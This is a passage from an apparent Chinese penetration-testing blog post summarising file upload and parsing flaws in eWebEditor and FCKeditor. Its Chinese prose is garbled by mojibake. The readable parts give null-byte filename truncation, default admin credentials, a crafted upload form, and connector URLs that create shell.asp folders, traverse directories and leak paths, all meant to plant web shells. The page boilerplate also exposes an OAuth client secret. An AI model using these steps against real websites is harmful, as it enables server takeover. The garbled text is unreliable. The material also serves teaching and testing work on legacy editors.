<pre><code>  å­—ç¬¦é˜¶æ®µè¢«åˆ©ç”¨æœ€å¤šçš„æ˜¯å†æ–‡ä»¶æ“ä½œä¸Šé¢ï¼Œé€šå¸¸ç”¨æ¥åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´å’Œæ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œ%00å³NULL æ˜¯ä¼šè¢«GPCå’Œaddslashess()å‡½æ•°è¿‡æ»¤ï¼Œå¦å¤–å†php5.3ä¹‹åçš„ç‰ˆæœ¬å…¨é¢ä¿®å¤äº†æ–‡ä»¶å%00æˆªæ–­çš„é—®é¢˜</code></pre><h3 id="åˆ©ç”¨-7"><a href="#åˆ©ç”¨-7" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><ul>
<li>ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œä½¿ç”¨burpæŠ“åŒ…,è¿™é‡Œè·¯å¾„å’Œæ–‡ä»¶åä¸¤ä¸ªå‚æ•°æˆ‘ä»¬å¯æ§ï¼Œå¦‚æœæœåŠ¡å™¨ç¨‹åºæ²¡åšéªŒè¯çš„è¯ï¼Œæˆ‘ä»¬è¿™é‡Œå¯ä»¥ä¸Šä¼ ä»»æ„ç±»å‹çš„é—®é¢˜ã€‚</li>
</ul>
<p><img src="https://i.loli.net/2019/09/01/2TBWvwPixFlYLSI.png" alt="image.png"></p>
<ul>
<li><p>ä¿®æ”¹æ–‡ä»¶åï¼Œåœ¨å…¶åé¢åŠ ä¸Š <code>.asp</code>  </p>
</li>
<li><p>ç‚¹å‡» <code>Hex</code> æ‰¾åˆ°ä¿®æ”¹çš„æ–‡ä»¶åå¯¹åº”çš„ç¼–ç ï¼Œå°†ç©ºæ ¼çš„<code>20</code>ç¼–ç ä¿®æ”¹ä¸º<code>00</code>ï¼Œä¿®æ”¹å®Œå<code>Go</code>å‘é€ï¼Œä¸Šä¼ æˆåŠŸ</p>
</li>
</ul>
<h2 id="ç¼–è¾‘å™¨æ¼æ´"><a href="#ç¼–è¾‘å™¨æ¼æ´" class="headerlink" title="ç¼–è¾‘å™¨æ¼æ´"></a>ç¼–è¾‘å™¨æ¼æ´</h2><h3 id="Ewebeditor"><a href="#Ewebeditor" class="headerlink" title="Ewebeditor"></a>Ewebeditor</h3><h4 id="ç®€ä»‹-9"><a href="#ç®€ä»‹-9" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>â€‹    eWebEditoræ˜¯ä¸€ä¸ªåŸºäºæµè§ˆå™¨çš„åœ¨çº¿HTMLç¼–è¾‘å™¨ï¼ŒWEBå¼€å‘äººå‘˜å¯ä»¥ç”¨å®ƒæŠŠä¼ ç»Ÿçš„å¤šè¡Œæ–‡æœ¬è¾“å…¥æ¡† â€œtextareaâ€æ›¿æ¢ä¸ºå¯è§†åŒ–çš„å¯Œæ–‡æœ¬è¾“å…¥æ¡†ã€‚</p>
<h4 id="åˆ©ç”¨-8"><a href="#åˆ©ç”¨-8" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><ul>
<li><p><code>/editor</code>  ç›®å½•æ‰“å¼€åé‡å®šå‘åˆ°/evebeditor/adminç›®å½•ä¸‹ </p>
</li>
<li><p>è®¿é—®/ewebeditor/admin_login.aspè¯¥è·¯å¾„ï¼Œè¿›å…¥ç®¡ç†å‘˜ç™»é™†é¡µé¢ï¼Œé»˜è®¤ç”¨æˆ·åå¯†ç éƒ½ä¸ºroot</p>
</li>
<li><p>è®¿é—®/ewebeditor/db/ewebeditor.mdbè¯¥è·¯å¾„ï¼Œå¯ä»¥ä¸‹è½½è¯¥ç¼–è¾‘å™¨æ•°æ®åº“æ–‡ä»¶ï¼Œå¯ä»¥æ‰¾åˆ°ä»¥md5å€¼å­˜å‚¨çš„ç”¨æˆ·åå’Œå¯†ç ã€‚</p>
<ul>
<li>è¿›å…¥åå°åï¼Œä¿®æ”¹å…è®¸ä¸Šä¼ çš„æƒé™ï¼Œè¿™é‡ŒæœåŠ¡å™¨æ˜¯IIS ï¼Œæ·»åŠ äº†asp</li>
</ul>
</li>
</ul>
<h3 id="FCKeditor"><a href="#FCKeditor" class="headerlink" title="FCKeditor"></a>FCKeditor</h3><h4 id="ç®€ä»‹-10"><a href="#ç®€ä»‹-10" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>â€‹    FCKeditorç¼–è¾‘å™¨æ˜¯ç›®å‰æœ€ä¼˜ç§€çš„å¯è§å³å¯å¾—| |ç½‘é¡µç¼–è¾‘å™¨ä¹‹ä¸€ï¼Œå®ƒé‡‡ç”¨çš„çš„çš„JavaScript ç¼–å†™å…·å¤‡åŠŸèƒ½å¼ºå¤§ï¼Œé…ç½®å®¹æ˜“ï¼Œè·¨æµè§ˆå™¨ï¼Œæ”¯æŒå¤šç§ç¼–ç¨‹è¯­è¨€ï¼Œå¼€æºç­‰ç‰¹ç‚¹ã€‚FCKeditorç¼–è¾‘å™¨è½»é‡åŒ–ï¼Œä¸éœ€è¦å¤ªå¤æ‚çš„å®‰è£…æ­¥éª¤å³å¯ä½¿ç”¨ã€‚</p>
<h4 id="åˆ©ç”¨-9"><a href="#åˆ©ç”¨-9" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><ul>
<li>æŸ¥çœ‹FCKç¼–è¾‘å™¨ç‰ˆæœ¬ <code>FCKeditor/_whatsnew.html</code></li>
</ul>
<p><strong>Version 2.2 ç‰ˆæœ¬</strong></p>
<ul>
<li>Apache+linux ç¯å¢ƒä¸‹åœ¨ä¸Šä¼ æ–‡ä»¶åé¢åŠ ä¸ª.çªç ´ï¼æµ‹è¯•é€šè¿‡ã€‚</li>
</ul>
<p><strong>Version &lt;=2.4.2 For php</strong></p>
<ul>
<li>åœ¨å¤„ç†PHP ä¸Šä¼ çš„åœ°æ–¹å¹¶æœªå¯¹Media ç±»å‹è¿›è¡Œä¸Šä¼ æ–‡ä»¶ç±»å‹çš„æ§åˆ¶ï¼Œå¯¼è‡´ç”¨æˆ·ä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼å°†ä»¥ä¸‹ä¿å­˜ä¸ºhtmlæ–‡ä»¶ï¼Œä¿®æ”¹actionåœ°å€ã€‚</li>
</ul>
<pre><code>&lt;form id=&quot;frmUpload&quot; enctype=&quot;multipart/form-data&quot;
action=&quot;http://www.site.com/FCKeditor/editor/filemanager/upload/php/upload.php?Type=Media&quot; method=&quot;post&quot;&gt;Upload a new file:&lt;br&gt;
&lt;input type=&quot;file&quot; name=&quot;NewFile&quot; size=&quot;50&quot;&gt;&lt;br&gt;
&lt;input id=&quot;btnUpload&quot; type=&quot;submit&quot; value=&quot;Upload&quot;&gt;
&lt;/form&gt;</code></pre><p><strong>FCKeditor æ–‡ä»¶ä¸Šä¼ â€œ.â€å˜â€œ_â€ä¸‹åˆ’çº¿çš„ç»•è¿‡æ–¹æ³•</strong></p>
<ul>
<li><p>å¾ˆå¤šæ—¶å€™ä¸Šä¼ çš„æ–‡ä»¶ä¾‹å¦‚ï¼šshell.php.rar æˆ–shell.php;.jpg ä¼šå˜ä¸ºshell_php;.jpg è¿™æ˜¯æ–°ç‰ˆFCK çš„å˜åŒ–ã€‚</p>
</li>
<li><p>æäº¤shell.php+ç©ºæ ¼ç»•è¿‡ï¼Œä¸è¿‡ç©ºæ ¼åªæ”¯æŒwin ç³»ç»Ÿ *nix æ˜¯ä¸æ”¯æŒçš„[shell.php å’Œshell.php+ç©ºæ ¼æ˜¯2 ä¸ªä¸åŒçš„æ–‡ä»¶ æœªæµ‹è¯•ã€‚</p>
</li>
<li><p>ç»§ç»­ä¸Šä¼ åŒåæ–‡ä»¶å¯å˜ä¸ºshell.php;(1).jpg ä¹Ÿå¯ä»¥æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œåªæ£€æµ‹äº†ç¬¬ä¸€çº§çš„ç›®å½•ï¼Œå¦‚æœè·³åˆ°äºŒçº§ç›®å½•å°±ä¸å—é™åˆ¶ã€‚</p>
</li>
</ul>
<p><strong>çªç ´å»ºç«‹æ–‡ä»¶å¤¹</strong></p>
<pre><code>FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=%2Fshell.asp&amp;NewFolderName=z&amp;uuid=1244789975684
FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=CreateFolder&amp;CurrentFolder=/&amp;Type=Image&amp;NewFolderName=shell.asp</code></pre><p><strong>FCKeditor ä¸­test æ–‡ä»¶çš„ä¸Šä¼ åœ°å€</strong></p>
<pre><code>FCKeditor/editor/filemanager/browser/default/connectors/test.html
FCKeditor/editor/filemanager/upload/test.html
FCKeditor/editor/filemanager/connectors/test.html
FCKeditor/editor/filemanager/connectors/uploadtest.html</code></pre><p><strong>FCKeditor å¸¸ç”¨ä¸Šä¼ åœ°å€</strong></p>
<pre><code>FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/
FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/asp/connector.asp
FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=http://www.site.com%2Ffckeditor%2Feditor%2Ffilemanager%2Fconnectors%2Fphp%2Fconnector.php (ver:2.6.3 æµ‹è¯•é€šè¿‡)
JSP ç‰ˆï¼š
FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/jsp/connector.jsp</code></pre><p>æ³¨æ„çº¢è‰²éƒ¨åˆ†ä¿®æ”¹ä¸ºFCKeditor å®é™…ä½¿ç”¨çš„è„šæœ¬è¯­è¨€ï¼Œè“è‰²éƒ¨åˆ†å¯ä»¥è‡ªå®šä¹‰æ–‡<br>ä»¶å¤¹åç§°ä¹Ÿå¯ä»¥åˆ©ç”¨../..ç›®å½•éå†ï¼Œç´«è‰²éƒ¨åˆ†ä¸ºå®é™…ç½‘ç«™åœ°å€ã€‚</p>
<p><strong>å…¶ä»–ä¸Šä¼ åœ°å€</strong></p>
<pre><code>FCKeditor/_samples/default.html
FCKeditor/_samples/asp/sample01.asp
FCKeditor/_samples/asp/sample02.asp
FCKeditor/_samples/asp/sample03.asp
FCKeditor/_samples/asp/sample04.asp
ä¸€èˆ¬å¾ˆå¤šç«™ç‚¹éƒ½å·²åˆ é™¤_samples ç›®å½•ï¼Œå¯ä»¥è¯•è¯•ã€‚
FCKeditor/editor/fckeditor.html ä¸å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œå¯ä»¥ç‚¹å‡»ä¸Šä¼ å›¾ç‰‡æŒ‰é’®å†é€‰æ‹©æµè§ˆæœåŠ¡å™¨å³å¯è·³è½¬è‡³å¯ä¸Šä¼ æ–‡ä»¶é¡µã€‚</code></pre><p><strong>åˆ—ç›®å½•æ¼æ´ä¹Ÿå¯åŠ©æ‰¾ä¸Šä¼ åœ°å€</strong></p>
<pre><code>Version 2.4.1 æµ‹è¯•é€šè¿‡
ä¿®æ”¹CurrentFolder å‚æ•°ä½¿ç”¨ ../../æ¥è¿›å…¥ä¸åŒçš„ç›®å½•
/browser/default/connectors/aspx/connector.aspx?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=../../..%2F&amp;NewFolderName=shell.asp
æ ¹æ®è¿”å›çš„XML ä¿¡æ¯å¯ä»¥æŸ¥çœ‹ç½‘ç«™æ‰€æœ‰çš„ç›®å½•ã€‚
FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=%2F
ä¹Ÿå¯ä»¥ç›´æ¥æµè§ˆç›˜ç¬¦ï¼š
JSP ç‰ˆæœ¬ï¼š
FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&amp;Type=&amp;CurrentFolder=%2F</code></pre><p><strong>FCKeditor çˆ†è·¯å¾„</strong></p>
<pre><code>FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=File&amp;CurrentFolder=/shell.asp</code></pre><p><strong>FCKeditor è¢«åŠ¨é™åˆ¶ç­–ç•¥æ‰€å¯¼è‡´çš„è¿‡æ»¤ä¸ä¸¥é—®é¢˜</strong></p>
<pre><code>    å½±å“ç‰ˆæœ¬: FCKeditor x.x &lt;= FCKeditor v2.4.3</code></pre><p>è„†å¼±æè¿°ï¼š<br>FCKeditor v2.4.3 ä¸­File ç±»åˆ«é»˜è®¤æ‹’ç»ä¸Šä¼ ç±»å‹ï¼š<br>html|htm|php|php2|php3|php4|php5|phtml|pwml|inc|asp|aspx|ascx|jsp|cfm|cfc|pl|bat|exe|com|dll|vbs|js|reg|cgi|htaccess|asis|sh|shtml|shtm|phtm<br>Fckeditor 2.0 &lt;= 2.2 å…è®¸ä¸Šä¼ asaã€cerã€php2ã€php4ã€incã€pwmlã€pht åç¼€çš„æ–‡ä»¶ä¸Šä¼ åå®ƒä¿å­˜çš„æ–‡ä»¶ç›´æ¥ç”¨çš„$sFilePath = $sServerDir . $sFileNameï¼Œè€Œæ²¡æœ‰ä½¿ç”¨$sExtension ä¸ºåç¼€.ç›´æ¥å¯¼è‡´åœ¨win ä¸‹åœ¨ä¸Šä¼ æ–‡ä»¶åé¢åŠ ä¸ª.æ¥çªç ´[æœªæµ‹è¯•]!<br>        è€Œåœ¨apache ä¸‹ï¼Œå› ä¸ºâ€Apache æ–‡ä»¶åè§£æç¼ºé™·æ¼æ´â€ä¹Ÿå¯ä»¥åˆ©ç”¨ä¹‹ï¼Œå¦å»ºè®®å…¶ä»–ä¸Šä¼ æ¼æ´ä¸­å®šä¹‰TYPE å˜é‡æ—¶ä½¿ç”¨File ç±»åˆ«æ¥ä¸Šä¼ æ–‡ä»¶,æ ¹æ®FCKeditor çš„ä»£ç ï¼Œå…¶é™åˆ¶æœ€ä¸ºç‹­éš˜ã€‚<br>        åœ¨ä¸Šä¼ æ—¶é‡è§å¯ç›´æ¥ä¸Šä¼ è„šæœ¬æ–‡ä»¶å›ºç„¶å¾ˆå¥½ï¼Œä½†æœ‰äº›ç‰ˆæœ¬å¯èƒ½æ— æ³•ç›´æ¥ä¸Šä¼ å¯ä»¥åˆ©ç”¨åœ¨æ–‡ä»¶ååé¢åŠ .ç‚¹æˆ–ç©ºæ ¼ç»•è¿‡ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨2003 è§£ææ¼æ´å»ºç«‹xxx.aspæ–‡ä»¶å¤¹æˆ–è€…ä¸Šä¼ xx.asp;.jpg!</p>
<p><strong>æœ€å¤è€çš„æ¼æ´ï¼ŒTypeæ–‡ä»¶æ²¡æœ‰é™åˆ¶ï¼</strong></p>
<p>â€‹    æˆ‘æ¥è§¦åˆ°çš„ç¬¬ä¸€ä¸ªfckeditoræ¼æ´äº†ã€‚ç‰ˆæœ¬ä¸è¯¦ï¼Œåº”è¯¥å¾ˆå¤è€äº†ï¼Œå› ä¸ºç¨‹åºå¯¹type=xxx çš„ç±»å‹æ²¡æœ‰æ£€æŸ¥ã€‚æˆ‘ä»¬å¯ä»¥ç›´æ¥æ„é€ ä¸Šä¼ æŠŠtype=Image æ”¹æˆType=hsren è¿™æ ·å°±å¯ä»¥å»ºç«‹ä¸€ä¸ªå«hsrençš„æ–‡ä»¶å¤¹ï¼Œä¸€ä¸ªæ–°ç±»å‹ï¼Œæ²¡æœ‰ä»»ä½•é™åˆ¶ï¼Œå¯ä»¥ä¸Šä¼ ä»»æ„è„šæœ¬ï¼ </p>

            </div>
            <hr />

            
            <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.88rem;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-large waves-effect waves-light red">èµ</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fa fa-close"></i></a>
            <h4 class="reward-title">å¤§çˆ·ï¼Œèµä¸ªé“œæ¿å‘—ï¼</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">å¾® ä¿¡</a></li>
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">æ”¯ä»˜å®</a></li>
                        
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="æ”¯ä»˜å®æ‰“èµäºŒç»´ç ">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.jpg" class="reward-img" alt="å¾®ä¿¡æ‰“èµäºŒç»´ç ">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>
            

            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">

<div id="article-share">
    
    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>å¾®ä¿¡é‡Œç‚¹â€œå‘ç°â€->â€œæ‰«ä¸€æ‰«â€äºŒç»´ç ä¾¿å¯æŸ¥çœ‹åˆ†äº«ã€‚</p>"></div>
    
</div>

<script src="/libs/share/js/social-share.min.js"></script>

            

    <div class="reprint" id="reprint-statement">
        <p class="reprint-tip">
            <i class="fa fa-exclamation-triangle"></i>&nbsp;&nbsp;
            <span>è½¬è½½è§„åˆ™</span>
        </p>
        
            <div class="center-align">
                <a rel="license" href="https://creativecommons.org/licenses/by/4.0/deed.zh">
                    <img alt=""
                         style="border-width:0"
                         src="https://i.creativecommons.org/l/by/4.0/88x31.png"/>
                </a>
            </div>
            <br/>
            <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                  property="dct:title" rel="dct:type">
                    ã€Šæ–‡ä»¶è§£ææ¼æ´æ€»ç»“ã€‹
                </span> ç”±
            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/09/15/parsing-vulnerability/" property="cc:attributionName"
               rel="cc:attributionURL">
                æœ‹ä¸åŒ
            </a> é‡‡ç”¨
            <a rel="license" href="https://creativecommons.org/licenses/by/4.0/deed.zh">
                çŸ¥è¯†å…±äº«ç½²å 4.0 å›½é™…è®¸å¯åè®®
            </a>è¿›è¡Œè®¸å¯ã€‚
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>å¤åˆ¶æˆåŠŸï¼Œè¯·éµå¾ªæœ¬æ–‡çš„è½¬è½½è§„åˆ™</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">æŸ¥çœ‹</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>


        </div>
    </div>

    
    <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
<link rel="stylesheet" href="/css/my-gitalk.css">

<div class="card gitalk-card" data-aos="fade-up">
    <div id="gitalk-container" class="card-content"></div>
</div>

<script src="/libs/gitalk/gitalk.min.js"></script>
<script>
    let gitalk = new Gitalk({
        clientID: 'e93401217abfdd028c4f',
        clientSecret: '3f2916f26a8ce3f21eedf23777c07a0deadb7084',
        repo: 'P1Kaju.github.io',
        owner: 'P1Kaju',
        admin: "P1Kaju",
        id: '2019/09/15/parsing-vulnerability/',
        distractionFreeMode: false  // Facebook-like distraction free mode
    });

    gitalk.render('gitalk-container');
</script>
    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fa fa-chevron-left"></i>&nbsp;ä¸Šä¸€ç¯‡</div>
            <div class="card">
                <a href="/2019/10/26/app-traffic-general-packet-capture-method/">
                    <div class="card-image">
                        
                        <img src="https://i.loli.net/2019/10/26/WNuODJyGAkSp2lH.jpg" class="responsive-img" alt="æ¸—é€æµ‹è¯• APPæµé‡é€šç”¨æŠ“åŒ…æ–¹æ³•">
                        
                        <span class="card-title">æ¸—é€æµ‹è¯• APPæµé‡é€šç”¨æŠ“åŒ…æ–¹æ³•</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            å¥½ä¹…ä¸è§ï¼Œè·ç¦»ä¸Šä¸€æ¬¡æ°´æ–‡ç« å·²ç»ä¸¤ä¸ªæœˆè¿‡å»äº†ã€‚ éå¸¸æŠ±æ­‰ï¼Œè®©å¤§å®¶ä¹…ç­‰äº†ã€‚
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-10-26
                        </span>
                        <span class="publish-author">
                            
                            <i class="fa fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/æ¸—é€æµ‹è¯•/" class="post-category" target="_blank">
                                    æ¸—é€æµ‹è¯•
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/æ¸—é€æµ‹è¯•/" target="_blank">
                        <span class="chip bg-color">æ¸—é€æµ‹è¯•</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                ä¸‹ä¸€ç¯‡&nbsp;<i class="fa fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2019/09/15/steam/">
                    <div class="card-image">
                        
                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="Steam Windowså®¢æˆ·ç«¯æœ¬åœ°ææƒ0day">
                        
                        <span class="card-title">Steam Windowså®¢æˆ·ç«¯æœ¬åœ°ææƒ0day</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            é€‚ç”¨äºWindowsç³»ç»Ÿæµè¡Œå¾—Steamæ¸¸æˆå®¢æˆ·ç«¯å­˜åœ¨ææƒ0Dayæ¼æ´ï¼Œè¯¥æ¼æ´å¯å…è®¸å…·æœ‰ä½æƒé™æ”»å‡»è€…ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œç¨‹åº
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-09-15
                            </span>
                        <span class="publish-author">
                            
                            <i class="fa fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/ç³»ç»Ÿæ¼æ´/" class="post-category" target="_blank">
                                    ç³»ç»Ÿæ¼æ´
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/ç³»ç»Ÿæ¼æ´/" target="_blank">
                        <span class="chip bg-color">ç³»ç»Ÿæ¼æ´</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>
</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('120')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + 'æ¥æº: æœ‹ä¸åŒBlog<br />'
            + 'ä½œè€…: æœ‹ä¸åŒ<br />'
            + 'é“¾æ¥: <a href="' + url + '">' + url + '</a><br />'
            + 'æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨CC BY-NC-SA 3.0è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () { bodyElement.removeChild(newdiv); }, 200);
    });
</script>

    

</main>


<footer class="page-footer bg-color">
    <div class="container row center-align">
        <div class="col s12 m8 l8 copy-right">
            ğŸš€ 2019 æœ‹ä¸åŒ. All Rights Reserved.
            
            &nbsp;<i class="fa fa-area-chart"></i>&nbsp;ç«™ç‚¹æ€»å­—æ•°:&nbsp;
            <span class="white-color">7k</span>
            

            <br>
            <span id="sitetime"></span>

            
            
        </div>
        <div class="col s12 m4 l4 social-link ">
    <a href="https://github.com/P1kAju" class="tooltipped" target="_blank" data-tooltip="è®¿é—®æˆ‘çš„GitHub" data-position="top" data-delay="50">
        <i class="fa fa-github"></i>
    </a>



    <a href="mailto:PopXP1Kaju@163.com" class="tooltipped" target="_blank" data-tooltip="é‚®ä»¶è”ç³»æˆ‘" data-position="top" data-delay="50">
        <i class="fa fa-envelope-open"></i>
    </a>





    <a href="https://user.qzone.qq.com/1340914307" class="tooltipped" target="_blank" data-tooltip="è®¿é—®æˆ‘çš„QQç©ºé—´" data-position="top" data-delay="50">
        <i class="fa fa-qq"></i>
    </a>



    <a href="https://weibo.com/P1kAju" class="tooltipped" target="_blank" data-tooltip="å…³æ³¨æˆ‘çš„å¾®åš" data-position="top" data-delay="50">
        <i class="fa fa-weibo"></i>
    </a>



    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS è®¢é˜…" data-position="top" data-delay="50">
        <i class="fa fa-rss"></i>
    </a>
</div>
    </div>
</footer>

<div class="progress-bar"></div>



<script language=javascript>
    function siteTime() {
        window.setTimeout("siteTime()", 1000);
        var seconds = 1000;
        var minutes = seconds * 60;
        var hours = minutes * 60;
        var days = hours * 24;
        var years = days * 365;
        var today = new Date();
        var todayYear = today.getFullYear();
        var todayMonth = today.getMonth() + 1;
        var todayDate = today.getDate();
        var todayHour = today.getHours();
        var todayMinute = today.getMinutes();
        var todaySecond = today.getSeconds();
        /* Date.UTC() -- è¿”å›dateå¯¹è±¡è·ä¸–ç•Œæ ‡å‡†æ—¶é—´(UTC)1970å¹´1æœˆ1æ—¥åˆå¤œä¹‹é—´çš„æ¯«ç§’æ•°(æ—¶é—´æˆ³)
        year - ä½œä¸ºdateå¯¹è±¡çš„å¹´ä»½ï¼Œä¸º4ä½å¹´ä»½å€¼
        month - 0-11ä¹‹é—´çš„æ•´æ•°ï¼Œåšä¸ºdateå¯¹è±¡çš„æœˆä»½
        day - 1-31ä¹‹é—´çš„æ•´æ•°ï¼Œåšä¸ºdateå¯¹è±¡çš„å¤©æ•°
        hours - 0(åˆå¤œ24ç‚¹)-23ä¹‹é—´çš„æ•´æ•°ï¼Œåšä¸ºdateå¯¹è±¡çš„å°æ—¶æ•°
        minutes - 0-59ä¹‹é—´çš„æ•´æ•°ï¼Œåšä¸ºdateå¯¹è±¡çš„åˆ†é’Ÿæ•°
        seconds - 0-59ä¹‹é—´çš„æ•´æ•°ï¼Œåšä¸ºdateå¯¹è±¡çš„ç§’æ•°
        microseconds - 0-999ä¹‹é—´çš„æ•´æ•°ï¼Œåšä¸ºdateå¯¹è±¡çš„æ¯«ç§’æ•° */
        var t1 = Date.UTC(2019, 09, 14, 00, 00, 00); //åŒ—äº¬æ—¶é—´2018-2-13 00:00:00
        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
        var diff = t2 - t1;
        var diffYears = Math.floor(diff / years);
        var diffDays = Math.floor((diff / days) - diffYears * 365);
        var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
        var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes);
        var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes * minutes) / seconds);
        document.getElementById("sitetime").innerHTML = "æœ¬ç«™å·²è¿è¡Œ " + diffYears + " å¹´ " + diffDays + " å¤© " + diffHours + " å°æ—¶ " + diffMinutes + " åˆ†é’Ÿ " + diffSeconds + " ç§’";
